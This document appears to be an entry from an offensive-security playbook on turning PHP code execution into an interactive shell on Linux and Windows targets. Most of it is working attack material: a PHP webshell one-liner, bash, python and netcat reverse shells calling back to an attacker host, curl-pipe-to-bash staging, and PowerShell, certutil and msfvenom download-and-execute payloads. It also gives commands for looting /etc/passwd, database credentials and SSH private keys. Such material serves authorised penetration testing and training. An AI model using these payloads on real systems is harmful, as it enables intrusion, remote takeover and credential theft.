title: PHP Webshell → Shell (cmd-shell + debug ladder)
body: Once you have PHP code execution (LFI->RCE, RFI, file upload, log poisoning), the fastest confirm is a one-line cmd-shell, NOT a reverse shell. Prove execution first with a cmd-shell, THEN go for an interactive shell - that ordering saves you from debugging a reverse shell that was never executing in the first place. The cmd-shell: <?php system($_GET['cmd']); ?> - hit it with &cmd=id and if you see uid=... you have RCE confirmed. The most common silent failure: hosting the payload on Kali's Apache (which EXECUTES the .php before serving it, so the target gets empty output) instead of python3 -m http.server (serves raw bytes - target executes it). When the interactive/reverse shell won't connect, work the debug ladder in cmd order - it's the exact sequence that beats the 'is it SELinux? the VPN? Kali?' spiral. The answer is almost always port mismatch or URL-encoding, not the network.
cmd: # ══════════════════════════════════════════════════ # STEP 1 - CMD-SHELL: confirm RCE before anything else # ══════════════════════════════════════════════════ # shell.php (host on Kali): # # Host with PYTHON, not Apache (Apache runs the php before serving it -> target gets nothing): python3 -m http.server 80 # Trigger via your RCE vector (RFI example) and confirm execution: # http://TARGET/image.php?img=http://KALI/shell.php&cmd=id # -> uid=48(apache) ... = RCE CONFIRMED. If you see raw # # # backticks # # POST, stealthier in logs # ══════════════════════════════════════════════════ # STEP 2 - INTERACTIVE SHELL via the confirmed cmd-shell # ══════════════════════════════════════════════════ # Listener FIRST, on 443 or 80 (high ports get egress-filtered): nc -lvnp 443 # Best method: host the shell as a FILE and curl it (keeps nasty chars OUT of the URL): # sh.sh: bash -i >& /dev/tcp/KALI/443 0>&1 # &cmd=curl%20KALI/sh.sh%7Cbash (%7C = pipe) # or two steps: &cmd=curl%20-o%20/tmp/s%20KALI/sh.sh then &cmd=bash%20/tmp/s # ══════════════════════════════════════════════════ # DEBUG LADDER - shell won't connect? Work TOP TO BOTTOM. # ══════════════════════════════════════════════════ # (1) PORT ALIGNMENT - the #1 cause. The port baked into your payload MUST equal # the port nc is listening on RIGHT NOW. Don't ctrl-C and restart nc on a # different port between attempts. If using a hardcoded PHP shell, grep it: # grep -i port shell.php # make it match your listener # # (2) PROVE EGRESS with ICMP before blaming the network. Ping yourself THROUGH the RCE: # sudo tcpdump -i tun0 icmp # terminal 1 # &cmd=ping%20-c%203%20KALI # terminal 2 / browser # Replies arrive -> egress works, it's your PAYLOAD or PORT (not SELinux/VPN/Kali). # No replies -> real egress block; loot via cmd-shell instead (see step 6). # # (3) URL-ENCODE the payload. >, &, spaces are STRUCTURAL in a URL and produce 400 Bad Request. # Inline bash one-liner encoded: # bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI%2F443%200%3E%261%27 # In Burp: select the cmd value -> Ctrl+U (URL-encode key chars). Or just host-as-file (avoids this). # # (4) HOST WITH PYTHON not Apache. If the target fetched your .php but nothing ran, # Apache executed it before serving. Use: python3 -m http.server 80 # # (5) TRY ANOTHER SHELL FLAVOR - system() may invoke sh (dash), where /dev/tcp and >& fail. # Force bash via the file method (curl|bash), or use a different language present on the box: # python: python -c 'import socket,os,pty;s=socket.socket();s.connect(("KALI",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' # nc: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KALI 443 >/tmp/f # perl: perl -e 'use Socket;...' # if perl present # Check what's installed: &cmd=which%20python%20python3%20perl%20nc%20bash # # (6) STILL NOTHING? You already have RCE via the cmd-shell - LOOT directly, skip the shell: # &cmd=cat%20/etc/passwd # &cmd=cat%20/var/www/html/db.php (DB creds / reused passwords) # &cmd=ls%20-la%20/home/*/.ssh (pull an id_rsa, SSH in instead) # &cmd=sudo%20-l # Pivot in through SSH with found creds rather than waiting on a callback. # ══════════════════════════════════════════════════ # WINDOWS TARGET — PHP WEBSHELL (IIS + PHP on Windows) # ══════════════════════════════════════════════════ # PHP on Windows runs under IIS or XAMPP/WAMP. Key differences: # - system() and shell_exec() call cmd.exe, NOT bash # - /bin/bash does NOT exist — use cmd.exe or powershell.exe # - Paths use backslashes: C:\Windows\Temp\ # - /dev/tcp does NOT exist — use PowerShell or a binary # - AN INTERACTIVE PHP REVERSE SHELL WILL NOT WORK. PHP's proc_open+ # stream_select loop (every pentestmonkey-style shell) is socket-only on # Windows; the pipes never report readable, so you get the cmd.exe banner # and then dead silence. This is a platform limit, not a bug you can flag # your way out of. Use PHP as a DROPPER only: confirm RCE with the # cmd-shell below, then stage a real .exe (Method A/C/D) and catch that. # ── STEP 1: CONFIRM RCE ON WINDOWS ────────────── # Upload or reach your webshell, then test: # http:///shell.php?cmd=whoami # Expected output: iis apppool\defaultapppool or nt authority\system # http:///shell.php?cmd=systeminfo # OS version # http:///shell.php?cmd=dir+C:\ # directory listing # ── STEP 2: CHECK WHAT'S AVAILABLE ───────────── # http:///shell.php?cmd=where+powershell # is PS available? # http:///shell.php?cmd=where+certutil # http:///shell.php?cmd=where+curl # ── STEP 3: GET A REVERSE SHELL (Windows) ─────── # Method A — PowerShell download + exec (most reliable): # On Kali: msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f exe -o shell.exe # python3 -m http.server 80 && nc -lvnp # Then trigger via webshell: # http:///shell.php?cmd=powershell+-c+"(New-Object+Net.WebClient).DownloadFile('http:///shell.exe','C:\Windows\Temp\shell.exe');+C:\Windows\Temp\shell.exe" # Method B — PowerShell IEX reverse shell (no binary): # On Kali: serve Nishang PS reverse shell # cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1 # echo 'Invoke-PowerShellTcp -Reverse -IPAddress -Port ' >> shell.ps1 # python3 -m http.server 80 && nc -lvnp # Trigger: # http:///shell.php?cmd=powershell+-c+"IEX(New-Object+Net.WebClient).DownloadString('http:///shell.ps1')" # Method C — certutil (when PowerShell is restricted): # http:///shell.php?cmd=certutil+-urlcache+-f+http:///shell.exe+C:\Windows\Temp\shell.exe # http:///shell.php?cmd=C:\Windows\Temp\shell.exe # Method D — SMB direct exec (no HTTP, no disk write): # On Kali: impacket-smbserver Share /path -smb2support # http:///shell.php?cmd=\\\Share\shell.exe # ── WINDOWS-SPECIFIC WEBSHELL ONE-LINERS ──────── # cmd.exe aware shell: # # PowerShell aware shell: # # Both: # $o"; ?> # ── EGRESS CHECK ON WINDOWS ───────────────────── # Confirm the box can reach Kali BEFORE sending a shell: # python3 -m http.server 80 (on Kali) # http:///shell.php?cmd=powershell+-c+"Invoke-WebRequest+http:///test" # Or: http:///shell.php?cmd=ping+-n+3+ # Watch Kali — any hit = egress works, debug the payload not the network. # ── URL ENCODING FOR WINDOWS CMD ───────────────── # Windows-specific chars that need encoding in GET params: # space = + or %20 # \ = %5C (backslash — but often + works fine in cmd paths) # | = %7C (pipe) # & = %26 (ampersand — BREAKS the URL query string, always encode) # > = %3E (redirect) # Safe to use in webshell cmd: ping, dir, type, whoami, systeminfo, certutil # Always test with simple commands first before sending a shell payload. # ── WRITABLE PATHS ON WINDOWS ─────────────────── # C:\Windows\Temp\ (always writable by service accounts) # C:\Users\Public\ (world-writable) # C:\inetpub\wwwroot\ (writable if running as IIS identity) # %TEMP% (current user's temp — varies)
warn: Confirm RCE with the cmd-shell (&cmd=id) BEFORE debugging a reverse shell - half of 'shell won't connect' is actually 'code never executed.' When the box can ping you but no shell connects, it is NOT the network - it's port misalignment or URL-encoding. Host payloads with python3 -m http.server, never Kali's Apache (it executes .php before serving). On Windows, do not expect an interactive PHP reverse shell to work at all - PHP's stream_select is socket-only there, so it banners then hangs. Use the cmd-shell to confirm RCE, then drop a binary.

choices.label: Reverse shell connected — upgrade the TTY
Shell still won't catch — deeper troubleshooting
Egress blocked — loot via cmd-shell, find creds
Found an SSH key while looting
On the box — start Linux post-exploit enum
